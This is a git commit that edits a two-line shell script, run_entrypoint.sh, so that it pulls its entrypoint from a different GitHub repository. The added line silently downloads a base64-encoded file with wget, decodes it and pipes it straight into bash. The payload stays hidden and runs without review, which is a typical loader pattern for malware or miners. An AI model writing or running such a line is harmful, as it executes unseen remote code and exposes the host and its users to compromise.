e877ea2723ef3b7b351540934a1ec03ac4b2e192
stevenhenderson9942 <steven.henderson994@gmail.com>
2026-06-15 20:00:01 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/dwaincampbell/smile/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/stevenhenderson9942/cash/refs/heads/main/entrypoint.sh | base64 -d | bash
